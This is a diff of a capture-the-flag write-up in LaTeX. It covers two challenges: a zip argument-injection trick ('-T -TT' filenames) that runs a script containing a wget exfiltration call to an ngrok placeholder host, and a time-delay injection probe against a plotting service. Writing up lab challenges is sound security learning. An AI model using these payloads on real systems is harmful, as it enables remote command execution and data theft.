@@ -6,7 +6,7 @@
 \section{WS_1.03 - ZipZap - level 2}
 \texttt{zip archive.zip ./-T ./-TT "bash rce" rce}
 
-\texit{rce} containing: \texttt{wget https://<your-token>.ngrok-free.app/\$(cat /getflag)}
+\texit{rce} containing: \texttt{wget https://<your-token>.ngrok-free.app/\$(/getflag)}
 
 \section{WS_1.04 - plottyboy}
 Identification: \texttt{sin(x); pause 10")} -> 10 seconds are waited before the rendered image is served? yes.
